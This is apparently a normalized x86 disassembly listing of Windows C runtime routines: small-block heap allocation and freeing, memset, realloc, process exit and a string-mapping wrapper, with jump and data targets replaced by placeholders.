mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp edx 0x20
mov ebx 0x80000000
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
cmp edx esi
mov [ ebp - 0x4 ] ecx
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp edx 0x20
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
mov esi 0x80000000
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_429090
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_42b1a2
mov eax [ rw-data ]
mov ecx [ rw-data ]
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push esi
push 0x41c4
push 0x8
push [ rw-data ]
lea eax [ eax + eax * 4 ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
jne r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
xor eax eax
pop edi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
pop esi
pop edi
retn
sub_42b259
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
shl eax 0x1
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
mov [ ebp - 0x4 ] edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_42b35f
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
mov ebx 0x80000000
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
mov ebx 0x80000000
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
cmp edi 0x3f
lea ecx [ ecx + esi - 0x4 ]
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
cmp edi 0x20
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_42b63e
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov edx [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
push ebx
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push esi
lea eax [ eax + eax * 4 ]
push edi
dec ecx
cmp ecx 0x20
lea edi [ edx + eax * 4 ]
mov [ ebp - 0x4 ] edi
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov eax [ rw-data ]
mov ebx eax
mov [ ebp - 0xc ] esi
cmp ebx edi
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
jmp r-xdata
mov edx [ eax + 0xc4 ]
and edx [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
mov esi [ ecx ]
and esi [ ebp - 0xc ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
and edx [ ebp - 0x8 ]
inc [ ebp - 0x4 ]
add ecx 0x4
mov edi [ ecx ]
and edi esi
or edx edi
je r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx eax
je r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
jb r-xdata
shl ecx 0x1
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_42b259
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
jmp r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
add ebx 0x14
call sub_42b1a2
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_42b940
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_42b9a0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
xor eax eax
inc eax
retn
sub_42b9bb
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
push ebp
push edi
jne r-xdata
push esi
mov esi [ esp + 0x18 ]
test esi esi
jne r-xdata
push [ esp + 0x14 ]
call sub_429a56
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_429931
pop ecx
jmp r-xdata
pop edi
pop ebp
pop ebx
retn
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push ebx
call sub_42ae5f
mov ebp eax
test ebp ebp
pop ecx
je r-xdata
pop esi
push esi
call sub_42b9a0
test eax eax
pop ecx
jne r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
test eax eax
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
push esi
call sub_42b9a0
test eax eax
pop ecx
jne r-xdata
test esi esi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
inc esi
test esi esi
jne r-xdata
push esi
push ebx
push ebp
call sub_42b35f
add esp 0xc
test eax eax
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
inc esi
push esi
call sub_42b63e
mov edi eax
test edi edi
pop ecx
je r-xdata
mov edi ebx
jmp r-xdata
test ebp ebp
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_42e720
push ebx
push ebp
call sub_42ae8a
add esp 0x14
mov eax esi
push eax
push ebx
push edi
call sub_42e720
push ebx
call sub_42ae5f
mov ebp eax
push ebx
push ebp
call sub_42ae8a
add esp 0x18
mov eax esi
sub_42bb1d
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
push [ esp + 0x4 ]
call [ ExitProcess@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ esp + 0x4 ]
call eax
sub_42bb4d
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push edi
mov ecx rw-data
mov edi rw-data
xor eax eax
cmp ecx edi
mov esi ecx
jae r-xdata
call eax
push sub_42e49b
call sub_429aea
mov esi rw-data
mov eax esi
mov edi rw-data
cmp eax edi
pop ecx
jae r-xdata
test eax eax
jne r-xdata
xor eax eax
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
add esi 0x4
cmp esi edi
jb r-xdata
call ecx
test eax eax
jne r-xdata
sub_42bbb2
push ebp
mov ebp esp
push esi
xor esi esi
inc esi
cmp [ rw-data ] esi
push edi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
mov al [ ebp + 0x10 ]
mov [ rw-data ] esi
mov [ rw-data ] al
jne r-xdata
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov eax rw-data
mov esi rw-data
cmp eax esi
mov edi eax
jae r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
pop edi
pop esi
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax rw-data
mov esi rw-data
cmp eax esi
mov edi eax
jae r-xdata
mov eax [ rw-data ]
sub eax 0x4
cmp eax ecx
jmp r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
mov [ rw-data ] 0x1
call sub_42bb1d
add edi 0x4
cmp edi esi
jb r-xdata
call eax
mov eax [ edi ]
test eax eax
je r-xdata
mov [ rw-data ] eax
jae r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ rw-data ]
sub eax 0x4
cmp eax [ rw-data ]
call eax
sub_42bcb4
cmp [ rw-data ] 0x3
push esi
jne r-xdata
push [ esp + 0x8 ]
mov esi [ esp + 0x8 ]
push esi
call sub_42ae5f
test eax eax
pop ecx
je r-xdata
push esi
jmp r-xdata
mov eax [ esi - 0x4 ]
sub eax 0x9
pop esi
retn
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop esi
retn
sub_42bcec
push 0x38
push r--data
call sub_42a4d8
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor esi esi
inc esi
push esi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov [ ebp - 0x34 ] ebx
xor edi edi
mov [ ebp - 0x38 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
or eax 0xffffffff
sub eax ecx
add [ ebp + 0x14 ] eax
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_42ea5d
pop ecx
mov [ ebp - 0x3c ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
